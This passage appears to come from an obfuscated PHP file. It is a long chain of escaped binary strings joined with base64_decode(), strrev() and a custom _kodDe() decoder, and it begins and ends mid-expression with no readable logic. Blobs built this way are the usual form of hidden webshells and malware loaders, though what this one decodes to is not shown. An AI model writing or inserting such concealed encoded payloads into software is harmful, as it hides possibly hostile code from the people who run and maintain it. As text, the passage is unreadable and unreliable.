22\xdf\x81\xc1\x8\x4a\x8d\xc7\x96\xf1\x30\xbf\xc5\x5b\xe6\x56\x49\xa9\x61\xc8\x5c\xab\x38\x3a\xa2\xf9\x92\x66\xb6\x94\xcb".base64_decode('k8YqVdh+rcqDqQ25IaZUYd6OEnTse6AGO1wh1s7VK6s9dZ76WgV8LtES4GlJqQKjeV7O8Q==').base64_decode('EU+/I1bvqatVqgqDVdAuMa6o9SqFtBTNUwMNlpsrYBE1s+yiZiDypiQ9PImXR78O70lJnw==')."\x28\x41\xe7\x9\x41\xb8\xd3\x94\x40\x67\x8b\x13\x92\x3a\x5d\xea\xaa\x26\xc6\xa6\x49\x9f\xcd\x3d\xb7\xb0\x69\xae\xae\x55\xfa\xe1\xe\x48\x85\x4c\x52\xcc\x31\x18\x4d\x8e\xc1\xa8\x99\x1\x74\xa2\xab\x8d\xcf\x37"."\xbd\xe0\xa1\xd0\x8b\x7f\xb4\x59\x9a\xc5\x26\xa\x52\xc9\x54\xe1\x54\x3a\x5b\xc\xd6\x44\xdd\x40\x93\x43\xe1\x51\x80\xe7\xe0\xab\x10\xbc\x26\x44\x8e\x78\x6\x9b\x41\x9c\xce\x27\xb1\x42\x1e\xf1\x86\x55\x45\x65"."\x50\xda\xcf\x9c\x95\x66\xa4\xe\x3c\xc\x74\xac\xe4\x7d\x60\xb8\xac\x30\xc1\x88\xfb\xd2\xc2\x57\x18\x43\x89\x60\x3b\xc5\xf2\xb8\x84\xe6\xa9\xfe\x69\xe\x44\x15\xc3\xa9\x38\x50\x84\x6f\x64\x0\x8e\x2e\x17\x4c".base64_decode('EKYQuHBnazTWQa/uxYPtoY6AD4g4xQQKj6U+pUmpxpSPJlU7hp98iA1ZgnwVrSvVRiIcHQ==')."\205\102\32\32\3\263\257\20\127\11\32\51\322\124\115\75\332\100\225\334\351\133\64\226\120\321\0\0\171\226\250\156\265\304\55\44\313\170\174\21\155\230\355\100\204\310\301\245\71\156\324\71"."\200\344\65\223\371\355\111\365\63\277\161\350\303\370\173\301\150\147\153\230\335\140\154\201\275\174\41\145\72\200\132\142\141\354\310\4\332\246\260\252\244\173\243\50\42\114\127\120\244\60\222\342"."\x61\xe1\x1b\x2\x67\x70\x79\x0\x45\x84\x38\x80\x22\x9c\x11\x61\x28\xc9\xc1\x1d\xfe\x7e\xbc\x93\x87\x85\x48\x8e\x22\xdd\x71\x76\x81\x5\x53\xe6\xe5\x2d\x3c\xdc\xce\xaf\xf1\xe3\x8c\x68\x4c\x8a\x4\x62\x81\x8e"."\70\217\306\226\363\13\61\74\215\136\214\121\73\273\73\4\67\210\4\226\41\104\212\12\341\205\121\362\32\337\364\305\265\275\364\256\41\15\322\237\23\130\14\337\277\352\133\133\357\121\346\254"."\257\5\30\356\20\304\316\240\151\122\305\127\226\106\324\110\264\215\306\211\343\275\120\76\45\166\120\112\217\202\4\364\204\20\320\55\306\326\370\112\121\20\176\53\364\346\262\322\31\135\36\20"."\276\334\244\14\110\21\256\335\374\47\367\364\216\364\372\220\40\141\255\22\167\7\133\232\25\46\242\20\137\60\240\220\200\322\1\306\142\127\171\200\233\250\131\63\315\74\65\41\142\311\104\11"._kodDe('Kq/u+XYR/PZ5Zj1vnyuI1BY9MVHhb8ujcDvLYCO1Vsuajhd6mBRKD/Ivg49iuJ4NG4LI/W4=')."\41\272\242\151\144\41\374\300\36\161\41\210\256\20\135\324\304\47\63\264\164\135\47\372\327\226\130\27\102\377\42\350\47\222\100\323\145\160\0\264\134\43\341\45\241\165\370\77\221\121\313\7".strrev('ßoL'."\r".'j«U4¸¶@I/ˆÌrUtˆŠ_†'."\0".'Q'."\n".'X”9¬®éÜ.³â#ÿC®wrËŞ’').base64_decode('jFpV9VvdgC/c40lN9XH11cBfAvGgoMwOhCjHBXKlwYkI3N0gxNti0e4uKd4eWBbubGMx/w==')."\x74\x16\x9a\xe\x55\x2b\x2d\xe1\x38\x1a\xa2\x20\x43\x46\xe1\x5\x51\x8e\x83\x30\x4a\x44\x26\x59\x22\x76\xa0\x74\xb\xa2\xfa\x28\x22\x89\xf3\x78\xa3\x40\xa9\xb6\x73\x95\x35\x77\x87\x23\x2d\xf2\xcd\x7a\xc\x8"."\xcc\x86\x50\x7c\xe0\x37\xd3\x58\xe3\x58\x9c\xdc\xb1\x67\x11\x3c\xe4\x2c\x4c\xd0\x8d\x45\xc8\x18\xb0\x8\x1d\x0\x16\x23\xc3\xc5\x22\xc4\xdb\x22\x8b\x90\x8e\xb2\x8\xde\xb9\x84\x3a\x59\x1e\xda\xcb\xa2\x7d\x28".base64_decode('26BmtGF+Q3RBql9yh4JpsI/q8LBTHLTD07i+1qV2JRozSUFBzRwV6YY61t9KWi4/hUCCKQ==').base64_decode('gUG/vasWE8F5FcNTejnaThh21vFRuESJPhomN1elz7JbJkRdqZqSspzwdDlBKMioZh10yw==').strrev('7ı]hïO|ÂeîC'."\0".'ö©Ò×L¢§ôè´/Àğ—xMñV¦N-»F™Ö‰=­„ÿB').strrev('íQé{dÎsƒ)YFŠ´CPØ'."\0".'ÉªŞŞïûœT—ct8~}­ùEmÎö´\'_è‚ÿFkı').base64_decode('HNPjk+2fUKBTVb6It8SiXVTGUcKtCnVZoVRT5X81CG/BWAivMQrF8mqqHcq3RdUKXGOvdQ==')."\226\12\167\266\204\126\50\325\106\152\124\325\64\25\12\53\150\105\263\212\224\262\232\130\15\264\255\160\244\145\145\314\21\105\106\122\266\43\17\322\264\204\100\334\62\341\217\70\237\140\127\206".base64_decode('PbDt5zlU5qZZ4Thi+5EI6SnKMiwsKnsU7iMCJ+LtDVXkQkUsg1ZEs0IrErEATiTy7UFT0A==')."\37\102\226\360\376\253\230\323\350\75\132\42\25\372\126\201\32\142\225\103\10\245\342\51\26\103\1\357\10\343\224\372\304\163\210\56\202\16\263\254\251\130\2\162\75\215\165\305\302\35\201\330"."\112\30\62\261\313\200\205\153\146\35\267\251\105\304\260\272\245\373\374\235\250\325\362\375\176\72\307\234\116\243\35\63\243\323\250\65\64\130\205\147\236\6\301\305\256\312\257\153\63\65\115\15"."\xbb\xf6\xec\x61\x1\xe6\x2f\x83\x5c\x25\x63\x7a\xb9\x1c\x22\x5c\x3c\x26\x66\xd\x70\x1f\x66\x45\xce\x95\x2f\xc3\x9\x1f\xc0\x98\xd5\xe2\x49\x66\x3c\xa3\x35\xd0\x1d\x91\x53\x60\xa8\x94\x25\xa1\x95\x5f\xb2\x46".base64_decode('WEsrrRGWxxQ+fLVBf2pmQ/+oJ4+aBrTrLeWxzx/uZhRaBRy6OxFVEReKhTBPgB7xYZXaKw==')."\355\354\345\111\201\152\60\0\167\250\374\45\135\143\60\225\272\306\313\163\335\126\250\263\55\334\31\152\352\30\13\307\3\35\12\153\70\150\357\260\163\321\171\120\117\70\252\106\220\144\255\312".base64_decode('CrpwFFTaDs+VqircwPg0YThvF0uSD0DDJEbqHfw+C7GqRwgREF4guNqd5JX6cWmZ6UF5lw==')."\203\130\303\154\304\71\30\230\312\72\13\4\270\352\370\270\333\52\135\116\26\6\363\342\134\232\35\175\163\37\202\120\240\133\362\342\200\13\53\354\203\344\174\52\357\154\36\142\263\131\346\307"."\113\325\105\157\162\272\145\361\363\351\104\106\127\254\202\236\44\36\111\25\360\241\247\244\114\335\22\56\314\141\354\311\156\213\5\355\214\360\167\41\273\362\155\151\146\203\134\312\333\161\75\13".base64_decode('xw0t/eRmgrhDKO5sSTcWyKmRmDnqnNBVEGoK86GRoERiRPjuxYc0os4+pk8Q47HGYEzQfQ==')."\xac\xc9\x1b\x99\x37\xbb\xf4\x62\xce\x20\x27\x53\xcb\xc5\xc1\x13\xf0\x19\x54\x1\x9d\x7f\x9f\xe2\x2a\x27\x8f\x3a\x3e\xcd\x2c\x83\xc4\x7e\x3d\xbe\x6c\xe\x99\xb\x37\xd2\x32\xe9\x2\x29\x8e\x2\xae\xe0\xa3\x59"."\351\132\116\51\217\76\342\225\57\172\41\334\41\211\322\325\22\346\311\221\306\346\202\325\27\302\117\10\244\41\205\375\26\131\216\117\370\1\42\165\142\251\312\53\374\162\244\64\371\116\255\344"."\x4\xff\x58\x19\x53\xc8\x94\xb\xdc\x1e\x30\x64\x27\x1d\x3e\xe1\xfe\x98\x2f\x97\x13\xf8\x44\xe1\xbb\xe6\x60\x1f\x80\x5\xf6\x1\x55\x6a\x4b\x17\x87\x17\x4e\x4f\xe9\x68\x48\xd3\x40\x12\x68\x90\x2c\x70\xa5\x51".base64_decode('NKLdwPg/JuGOlNrBfFaB8+WImea0CQmu4BjNQZ/CUSjr0/FFM3rtJ8T9VqKC1LvfVxfqlg==')."\374\117\117\102\122\52\226\13\2\40\377\140\221\50\244\276\372\203\61\135\160\175\124\214\334\353\373\312\102\202\304\222\57\221\102\22\131\166\225\41\350\110\357\40\301\314\147\40\133\340\30\342"."\5\235\121\265\35\261\233\50\23\112\14\53\341\40\357\254\24\220\20\33\311\114\111\77\271\45\15\33\307\5\344\344\213\236\310\302\144\257\105\224\233\207\230\365\12\270\100\23\302\100\200\376"."\254\314\245\274\250\341\200\165\51\335\346\36\250\60\25\144\267\113\161\233\245\73\346\71\116\140\107\44\147\263\332\260\216\257\361\61\265\114\231\341\17\164\245\274\163\320\104\174\264\26\217\166"."\307\330\371\17\216\143\335\226\32\13\5\127\362\243\30\236\332\32\130\346\116\11\143\275\145\240\255\142\62\327\230\341\164\262\65\125\143\121\254\166\14\105\132\135\5\342\355\334\121\261\63\115"."\x8d\x84\x3b\x97\x54\xcc\x40\xa2\x49\x87\x54\x84\x26\x86\x13\xa1\xe\x77\x9a\xb3\x86\x78\x28\x10\x63\x9e\xb4\x71\xbc\x39\x12\xd\x4a\xd9\xe1\x68\xf9\x48\x70\xd9\x87\x27\x52\xc5\x24\x4d\xf4\x9f\x5c\xd3\xbb\x96"."\354\212\32\321\346\50\265\16\153\60\274\152\337\214\332\305\275\353\153\153\172\375\213\175\323\271\342\215\222\53\351\16\363\44\311\26\143\76\215\356\4\314\267\130\42\55\6\61\277\317\7\37"."\341\1\177\257\237\271\71\363\213\114\370\25\360\123\135\74\6\74\327\307\251\317\50\107\103\135\256\125\230\23\3\237\373\256\235\312\56\330\61\312\252\15\60\273\207\60\75\341\125\343\53\343"."\x7c\xae\x9c\x69\xe\x8c\xa4\x38\x2d\x9b\x7f\xb8\x80\xd1\xbf\x2e\x19\x14\x5b\x16\x55\x4\x74\xa0\xb4\xe3\xee\xb8\x9c\xe4\x33\x4c\xb1\x5a\xc4\xb2\x4e\x99\xc9\x12\xf6\x52\x25\xe6\x48\xdc\x34\x47\x49\x3e\x47\x15".base64_decode('iKAPCu0ArMo4W715xCuBGQeR1NrWHj5xSaSjM9q1NBZPdC9bvmIlONZsZEgzoHiZLgT8+w==')."\xfa\x87\xb5\xa2\x7f\x98\xbd\x5a\xb0\xc\x6f\x3a\x74\xcb\x2f\xb\x73\x3c\x11\xf5\x11\x7b\x5f\x66\x8e\xe3\xa8\xa\x83\xe7\x62\xea\xe1\xaf\x9c\x45\x6b\xf3\xe7\xf2\x76\xfd\x24\x10\x5d\x45\xbd\xdf\x34\xed\x49\x72".base64_decode('l3V8ecWQ2dNr9XEsTenDEBSmeZbYaoGQ4ZVfT8DYKsuLqX6XNAAJ4mBCkhmk0wrmf5tGxw==').base64_decode('dGHQaI5I/quHiItUt3/VIa826MgX3qqHvGjb6Yi7fKweT2h7h5kuNvht3II84gcwCiAhyA==')."\xe8\x4f\x78\x4\xb7\x4c\xc2\x9c\xa8\xdd\xb5\xf8\x78\x22\x77\x36\x12\x27\x16\x9a\x8d\xca\x2c\x78\x67\xa0\x15\xc9\xd2\x29\xa5\x87\x8a\xc7\xa0\xca\xc7\xa2\x15\x71\x95\x4f\xa3\x1e\x45\x78\xf3\x66\x4a\x58\xa7\x9b"."\x6e\x86\xff\xc4\x91\x90\x90\xb9\x93\xb2\xab\x9\x46\x4d\x73\x83\xc2\x68\x25\x37\xc8\x4d\x44\x92\xe\x69\x2\x33\x6e\x11\x2b\x4a\x2\x3\x3c\x8\x82\xf2\x9a\xc7\x98\x35\x2f\xdc\xbd\x6d\x1e\x8b\x49\x4f\x1d\x39".base64_decode('3HzIT6hohUIwg/vgWJSOpKQcYbRxABvQyEY6Tp/hKLuFSm8pDm+JEPf7OiB5hC2rAUl6+Q==').base64_decode('EHM3UJaLxEJDZH95WzrIMHNg2BkA1jOeYLHVdvyo17Qsb6FoYlu8JiOX9lsjkJfVLHuZww==')."\15\323\127\272\14\307\336\106\72\270\234\14\115\30\365\22\354\146\37\221\204\31\177\221\230\56\171\106\200\57\170\210\237\120\265\216\41\216\37\265\315\217\335\110\22\201\226\233\320\105\343\354".base64_decode('/MfZe2pJJG2xwZMdd5PNnWgLT9tUbU/DwgUwkssDaex8xcyzB3/oEwyyK/eUTprL3Q1IXg==')."\320\361\123\40\150\311\63\53\103\311\37\72\222\364\322\174\32\211\327\143\331\273\44\36\162\157\316\361\2\10\235\40\247\227\161\113\327\7\231\125\44\236\155\101\131\212\334\31\74\75\351\365"."\x56\x4c\xf0\x4a\x76\x8e\x74\x5d\x49\xaf\x42\xe0\xcf\xc1\x6\x3f\x43\xdf\x9b\x80\xf6\xd2\x9f\x93\x2a\xb5\xde\x5b\x14\xfe\xd9\xd1\xec\xd0\xd7\x2b\x96\xe8\x63\xcc\xe5\xb9\x8b\xdc\xb9\xbc\xa4\xf7\xb6\xf5\x76\xf4"."\46\344\356\332\105\155\140\0\65\126\362\33\353\150\213\160\312\16\330\104\136\163\141\103\60\271\113\167\70\252\70\276\242\107\170\310\214\321\276\7\361\266\152\24\77\263\41\34\227\166\307\42".base64_decode('jvMnAGW9XJPxBpnxl1nKpshWFX3KzKJdujiJnrjsmonbLtnzwNUT5/9i1857Jq68m6bTUQ==').base64_decode('a9HzfO4nzv3x7nuu2nPLA29fdssH9563Z/ud2Arpp7+gRknjWzZMXLJjfMs5e27fOHH3BQ==')."\x13\x57\x9d\xfe\xf6\xe5\x17\xfc\xf5\xd4\xd\xb0\x7a\xf2\xc4\x83\x6a\xa0\x98\x2e\x89\x71\xa2\x45\x26\xae\xb9\x77\xfc\xde\x2d\x6f\x5f\x7c\xf9\x9e\xed\xdb\x25\x78\x1b\xdb\xc8\x65\xa5\xe5\x83\x66\x72\xfc\x8c\x4d"."\157\237\176\303\370\226\13\167\137\374\323\262\2\364\3\356\271\306\335\273\344\254\335\127\154\224\162\334\205\232\211\267\166\261\77\347\145\150\306\370\5\233\167\377\162\207\273\20\175\166\240\102".base64_decode('oYlLz9x1zx2uQp1mvJTMNEtu4SfOO3P8liv4R3bt3EzN4l1FuFUch6f1l8PHGVa3mLqFeA==')."\152\207\146\47\141\41\357\336\166\77\152\17\35\61\171\346\306\267\237\261\373\232\323\166\157\73\33\146\142\353\366\361\13\256\237\330\366\363\335\327\336\302\253\5\254\162\30\6\343\12\156\335"."\260\347\216\115\23\227\335\301\1\361\262\117\51\2\206\140\24\205\301\127\0\310\7\167\337\167\341\356\173\256\304\110\162\316\206\335\33\356\32\277\162\307\370\125\247\362\317\216\357\334\51\106"."\x39\xea\x27\x8f\xa2\x55\x20\xb8\x4b\x71\x3a\x90\xdc\x1\x61\x6c\x5a\x28\x49\xef\xf2\xc9\x44\xe\xb\x5e\xdc\xba\x13\x6b\xa0\xe8\xb\x11\x4c\x9e\x22\x8f\x39\xc0\x8b\x42\x4d\x6c\xd1\xa2\x71\xcc\x37\x9b\x29\x18".base64_decode('+7VViHxWNVYdV4N+a6s8VXh3QeKYgOIE0o6qxuNqSKAWfD+tAd4heYEWCw/0sosR9ZDOLQ==')."\x17\x13\x56\x84\x19\x5d\x83\xbf\xc1\xcf\x98\xdf\xe2\x21\xfc\x45\xf1\xe\x58\x37\xe7\x39\xe2\x91\x5\xca\x7d\xe8\xe3\x2d\xec\x70\xb3\x53\xb7\x47\xcc\xa2\x6c\x7d\xdd\xc0\x2e\xb7\x66\x24\xde\x91\xb3\x80\xb\xd0"."\x77\xb\x84\x52\xb\x50\x8f\x9a\x19\x5e\xb0\xb9\x1c\xe9\xa0\x40\x3f\xb5\x6f\x76\x80\xdf\xf9\xeb\xf1\x4d\xb7\xbd\x7d\xd9\x36\x37\x2c\xd5\x9a\x0\x2c\x16\xd5\xca\x1e\x92\xa4\xf7\x46\xc6\x2f\xdc\x5a\xfe\x3d\x2"."\xef\xfc\x1a\x3\x1e\x3f\xed\xca\xdd\x17\xbb\x20\x99\x6d\xad\x22\xa9\xc7\x44\x1\x82\xfd\x2e\x3a\xc2\x79\x83\x5c\x84\xe2\xfb\xff\x66\x15\x51\x65\x65\x23\x56\xdb\xd3\x84\x15\xde\xee\xc2\x58\x29\xef\xc5\xea\x2b".strrev('’Ü@bÑ	%‚qa¤E˜ÜÊMÊ\';9& ¿"£S>úA›Ş'."\n".'HfYxNP	Î©zêö\\o')."\301\22\202\352\224\20\116\160\265\27\133\244\170\221\270\217\327\30\132\270\266\41\75\371\40\203\70\237\344\162\77\324\345\36\5\122\4\153\103\275\362\43\141\243\150\37\206\263\361\263\57\136"."\254\133\365\32\251\311\162\4\341\250\330\324\44\74\263\120\11\244\273\144\244\334\237\44\226\67\336\122\211\175\260\142\245\362\56\221\1\220\116\204\171\175\362\313\41\130\231\346\345\107\204\356"."\x87\x49\xc4\xce\x5a\x2b\x7f\x54\x65\x65\x2e\xa5\x34\xcc\x6c\x9c\x3d\x1f\xfd\x5\x29\x83\x19\xe\x95\xa\xec\xd2\x2\xa\xb2\x47\x57\x8e\xf5\xf\x30\x5a\x23\x9e\xd7\x62\x7d\xc3\x13\x2e\xbd\x52\xe3\x48\x16\xc3"."\xc8\xdf\xcd\x60\x44\xca\x1\x27\x5a\xeb\x78\x20\xe\x3a\x4a\x15\x3b\xd2\xb3\x3a\xe4\x60\x87\x92\x28\x6c\x4e\xa7\xf2\xe7\x87\x2a\x50\x6b\xb4\x45\x67\x72\x17\x48\xa1\x92\xcd\x1f\x9f\x90\x34\xb\x14\x39\xbc\x26"."\226\110\177\166\120\364\204\320\27\300\360\101\324\120\123\354\232\210\274\52\121\206\144\246\224\37\154\222\62\25\333\64\225\234\226\37\203\115\351\64\253\161\232\265\0\177\250\11\337\114\261\246"."\261\227\246\204\253\154\314\253\204\23\124\352\302\13\162\350\61\226\17\277\32\347\303\214\60\306\334\2\164\21\62\17\214\217\276\327\5\31\221\356\266\160\247\144\365\47\45\250\301\226\116\65".base64_decode('0NVVMQNmgiqXscmMb7X0bCgNLUQ7MiWJrzo1VeHUKsUqJpnD8Co/GJERACEYLTSgSDUuog==')."\14\40\64\361\222\20\315\256\136\264\320\157\100\111\237\177\52\46\333\176\154\76\227\77\36\117\242\154\315\103\122\133\205\27\64\105\131\250\51\164\270\232\252\311\121\111\265\222\101\254\235\333".base64_decode('FS9yF+ZPvC30a3ImXkAxk20b+ZZ9mDv9rHhKFpBeESCvMQW1/LLyIrhyX1LO6qHX3Prk6Q==')."\x23\x17\xcc\xca\x4b\xfb\x89\x52\xc8\x2f\x74\x15\x2a\x7d\xe\xb5\xf2\x19\x23\x3f\x5a\xab\x80\x18\xd8\xe\x6\xe1\x35\x33\x40\xd0\x92\x83\x18\xb3\x4\x1b\x80\x66\x40\x46\x17\xd6\x3c\xd0\xc\xc7\xbb\x29\xb6\x64"."\xd0\x54\xc2\xf7\x2c\xc9\x41\x4d\x51\xbc\x2e\xb7\x76\x2d\xad\x8\xbf\xa7\xb3\x7e\x7d\x79\x1a\x98\x4f\xbb\xb3\x2\x5\xc3\x9d\x84\x31\xc8\x9d\x86\x35\x40\x22\xd\xf1\x33\xe7\x67\x28\xf6\xca\x40\x22\x85\xc1\xd0"."\137\121\46\322\331\46\42\164\317\356\310\354\141\306\115\44\326\333\123\355\233\276\176\275\337\140\206\204\314\134\211\225\365\161\150\32\357\365\71\341\121\117\140\350\71\40\44\270\41\251\254\172"."\x22\x2c\xc2\x83\xfc\xd3\xc5\xdd\x50\x6e\x30\xa8\x60\x2b\xc2\xa6\xa6\x45\x3d\x5c\x84\xea\x63\x79\x2a\x51\x98\xc8\x73\xc7\x44\x50\xa3\x7e\x1e\x43\xa\xb4\x47\x4c\x2c\xe7\xc1\x60\xa7\x10\xb2\xf9\xba\xa0\x94\xc6"."\x47\x54\x78\x1\xa7\x4b\xf2\xc5\xe2\x1\x3e\x3a\xce\x72\x38\x50\x28\x38\x48\xa\x8b\xe0\x53\xab\xac\xd1\xef\xe7\x74\x80\x9e\x64\xf9\x92\xe2\xf2\x25\x3\x21\x54\xc8\x95\x8e\xed\xff\x5c\x19\xf8\x72\x18\x49\x1e"."\x46\x64\xd2\x2c\x72\xba\xc5\xd3\x51\x5d\x3c\x11\xd0\x1c\xd3\x16\x89\x94\xf0\xec\x85\x56\xb2\x68\x14\x6c\x7\x5d\xa3\x6f\x4a\x57\x91\x67\xdc\x56\x6b\xc3\x1a\x5\xa9\x52\x40\x3d\xd7\x54\x45\x5e\xe1\xa8\x42\x74".strrev('Ğ)pc»1§ƒó_’ŒDÛE>4æšŒ)V'."\n".'‚>•U¡<¨ë£+	Ò*¦Ù½É'."\r".'¸Æb0æŒ')."\11\347\207\123\117\246\277\307\115\145\230\104\336\355\314\42\201\230\334\264\40\164\213\110\335\3\130\355\112\201\340\211\316\256\130\64\21\15\262\27\360\234\372\131\232\66\213\355\40\54\172\215"."\x55\x6c\xba\xd8\x7d\x39\x6e\x2e\xc4\x20\xb8\xe8\xe0\x87\x14\xc0\x86\x62\x29\x9f\xe7\xf6\x9b\x18\x5f\x39\x7f\x6b\xaa\xfc\xa7\x87\x1c\x71\xea\xa9\xbe\x49\xf2\x95\x1e\x8d\x1d\x80\x2\x75\xa5\x27\xba\xf1\x4c\xc9"."\26\54\26\77\363\221\300\127\362\55\110\226\234\244\142\27\255\172\312\327\103\135\10\64\325\261\333\122\314\132\124\134\355\144\220\162\216\202\131\103\37\37\165\264\376\375\100\76\305\312\252\306"."\147\166\360\64\125\265\247\272\306\67\275\266\272\74\207\332\345\72\363\261\171\233\172\142\34\145\302\103\120\300\342\311\255\304\140\44\34\352\114\250\141\340\356\365\15\163\175\165\342\252\240\141"."\x9\x87\xc7\x34\x1c\x94\x1d\x23\xe0\x51\xf5\x39\xba\x55\x61\x68\xe8\xa1\x49\x82\x5b\x95\xea\x79\x87\xaa\x95\xe\x69\xd6\x64\xee\x70\x1b\xea\xea\xea\xbc\x75\xf5\xe8\x2f\xbb\x26\xc1\x9c\x70\x36\x32\xa7\x33\x12"."\110\135\135\43\371\113\63\310\53\157\200\202\316\34\104\22\31\55\7\200\21\135\207\6\1\357\104\333\340\22\23\66\173\202\370\256\251\202\233\6\323\42\254\142\21\366\21\57\265\214\254\72".base64_decode('HhFVyAE+xHT3IHDLCMBndgRAXY8zVokakiaDAu3l15wRmFg1C+gN8ybeqFA+1SN/zMcGlw==')."\x26\xa\xb7\xfb\x5e\x96\xe1\x95\x9f\xbe\x81\x42\x94\xd0\x89\x43\x3f\x47\xd3\x50\x19\xa7\xfb\x5b\x9c\x82\x24\x9b\x24\xef\x27\x4e\x90\xd4\xb0\x58\x80\x95\x5c\xfa\xe2\xa8\x7c\xb6\x47\xb2\xf9\x5d\x61\x12\xcb\x72"."\207\45\70\332\311\153\242\57\54\321\133\272\60\206\25\126\141\306\34\121\205\154\202\243\47\362\30\31\122\274\225\144\150\230\222\356\163\343\161\145\74\111\2\347\26\150\302\174\7\254\221\210"."\157\216\101\303\351\45\104\225\212\312\143\273\0\3\262\236\44\234\45\161\105\210\176\5\370\73\123\324\0\231\265\115\1\212\102\243\304\11\77\175\272\230\50\147\32\17\52\233\134\333\75\261"."\x64\x8e\x1c\xa7\x16\x6e\xb3\x3f\x16\x93\x66\x8a\x1d\x68\xc5\xbf\xc2\x32\x8f\xa5\x84\x58\x2\x3d\x8a\xb\x72\xdf\xb7\x52\x5\xee\x2c\x57\x99\x0\x3d\x7\x2b\x2b\x0\xe9\xe5\xd0\xe4\xb8\xb0\x2\x34\x4e\x77\x41".base64_decode('Ey+3Qe7MW3Z9S/VKkgWYBc+PCPMbVsewtMv0FYpmGs26JQ8aSu+qnMzByyErAPHWy3ByIg==')."\76\230\144\357\242\3\72\13\367\10\132\212\63\107\11\124\334\155\223\22\235\253\131\312\10\362\347\340\344\104\274\153\225\15\256\310\256\302\131\7\336\16\73\123\170\313\276\4\351\230\32\303"."\56\152\171\153\100\266\40\141\140\202\42\141\25\223\374\346\245\352\100\23\206\253\314\276\13\217\220\260\244\160\246\323\64\252\150\160\234\366\46\10\241\313\352\11\150\16\220\102\262\250\160\5"."\21\366\244\163\334\341\51\36\320\264\221\311\42\162\61\147\336\133\147\134\310\2\27\61\50\74\254\374\365\121\371\74\15\17\251\52\353\200\360\212\156\347\317\304\127\100\104\47\262\225\141\25"."\341\333\270\202\106\116\12\245\30\256\235\35\145\242\135\262\105\65\232\36\234\254\320\247\306\25\374\200\372\261\316\371\51\57\0\217\262\231\110\172\304\216\264\345\102\270\256\156\27\211\132\342"."\xa0\x88\xbc\xad\x54\x74\x63\xb6\xa9\xca\x34\x5f\x3\xd8\xcd\x4e\x63\x2f\xb2\x50\x7a\x2c\xcc\x24\xfc\xd0\xed\x1e\xd4\xad\x3e\xb4\xd5\x11\xdc\x4\x26\xa4\x87\x52\x63\x56\x27\x6e\x32\x84\x52\x6c\x7e\x14\x27\x77"."\x95\x78\x85\x22\x57\x84\xb8\x6e\x22\x83\xd5\x37\x7d\xa\x69\xe6\x2\xf2\x9e\x47\x85\x5c\xec\x0\x84\x7d\x8d\x3b\x15\x7\xca\x8f\x60\x4c\x9b\x6f\x8f\x71\xf5\x81\x94\xc4\x3e\x23\xb2\x7c\x9b\xa0\x45\xbc\x8b\x44"."\123\35\226\2\322\203\6\34\24\65\203\65\136\143\155\43\266\236\344\75\10\151\307\356\212\272\55\143\161\11\111\242\101\121\211\363\22\276\157\63\326\315\236\213\20\26\245\44\50\10\360\133"."\133\317\140\201\115\2\217\342\222\41\142\205\366\101\255\274\116\334\202\274\60\150\5\1\246\250\47\315\142\12\63\104\311\257\116\336\216\351\151\71\112\214\21\330\152\20\56\347\345\52\260\263"."\62\211\354\340\125\30\110\332\45\331\365\231\364\52\5\212\111\257\217\110\202\250\267\136\341\22\254\112\153\246\221\31\122\6\201\257\44\314\272\264\261\322\365\64\242\231\212\227\372\371\331\262"."\113\304\144\67\336\24\131\202\143\127\330\160\5\304\27\25\356\201\45\347\241\152\261\67\170\321\63\271\10\371\146\131\21\232\207\205\50\161\327\115\316\261\360\263\42\335\154\26\53\345\124\370"."\24\311\222\106\64\311\60\15\126\371\112\61\110\220\61\246\63\123\154\157\175\203\227\71\115\225\357\277\261\315\31\360\21\264\260\44\64\300\333\133\106\306\300\220\31\340\4\214\51\235\320\23".base64_decode('70/Czw1xaMXnk3i+4rGiJEvo3MiZuIaSybowRKK2zxigu1I+HSGc3eKwVncBoPXhzIcHRg==')."\104\143\250\167\52\323\141\75\350\252\4\136\261\221\237\120\41\245\104\77\204\111\77\112\62\351\63\46\322\300\10\203\52\352\64\213\335\131\340\104\116\44\47\114\236\130\156\224\205\261\22\252"."\xa4\x4e\x4\x60\xc7\x5b\x53\x8b\x9d\x8\x38\xb4\x8d\x1d\x63\xfc\x3a\x37\xb6\x60\xc4\x4c\x9a\xdb\xa8\x5b\x72\x84\xe5\x72\xe4\xb4\x1c\x11\x6a\xb1\xe9\x28\xcd\x93\x38\xd4\x8\xf3\xae\xca\x77\xea\x5d\xed\x5d\x7e"."\236\324\314\227\47\125\224\10\237\174\101\146\26\251\217\352\260\301\33\311\31\111\45\22\155\13\7\3\221\226\160\174\211\222\306\247\252\134\122\41\257\20\71\227\62\321\22\323\201\147\130\335"."\317\137\304\301\101\157\77\332\61\170\123\174\127\145\211\375\23\351\13\124\46\236\17\164\126\113\361\117\57\226\325\230\307\227\360\262\145\145\260\356\273\2\164\126\150\172\45\340\102\121\57\207"."\x1f\xd3\xb1\xa1\xa2\xd4\x62\xa9\x40\xa9\x42\x6b\x0\xbe\xf2\x17\xc8\x33\x46\x32\x34\x12\x84\xf4\xfc\x64\x8d\x37\xf2\xc3\x86\x65\x88\x85\xcf\x4a\x8c\xc9\xb5\x7\x5a\x3a\xc2\x9d\x6a\x20\x12\x89\x2e\x77\xd8\xf7"."\12\255\177\221\253\114\122\362\223\122\322\314\210\111\240\137\57\167\375\10\216\366\344\347\72\134\152\24\72\175\262\17\321\2\73\252\202\247\156\371\23\63\64\52\75\371\126\50\152\206\245\113".base64_decode('CfR1sulw503LZh0PuGYHpGjJyVkrfkqlH2BpRKSdHCAWbmtP/I+baqSEd0AjxQzI+M1m+g==')."\372\114\120\176\354\227\175\123\274\161\124\236\362\77\175\62\317\43\171\51\43\336\325\330\333\234\46\331\40\201\364\116\323\302\121\225\272\26\23\237\100\362\112\161\254\40\237\267\372\123\120\3"."\xf6\x83\x1a\x62\x67\x7b\x38\x22\x76\x28\x18\xa\x2a\xc1\x5f\xa1\xfb\x56\xb4\x1d\xc7\xaa\x43\xb6\x97\x61\x6a\x38\x44\x30\x60\xc0\x1d\x46\x93\xae\x37\xff\xdc\x66\xee\x8e\x17\xfd\xca\xbe\x41\x1e\x98\xa1\x79\xe4"."\14\12\101\366\211\76\241\30\177\120\112\24\165\347\124\150\0\312\126\204\162\213\3\50\115\112\35\175\176\222\77\26\244\54\144\376\33\304\7\210\57\303\120\256\140\73\366\364\355\362\225\27"."\151\112\150\2\326\364\24\271\252\216\316\71\213\342\211\155\142\223\251\312\134\222\10\112\142\247\207\355\51\315\334\130\131\202\103\17\26\141\275\341\26\316\370\201\245\374\200\51\217\72\241\347"."\370\326\23\175\134\226\252\34\74\150\347\241\333\345\317\324\321\342\377\67\5\151\146\134\162\152\35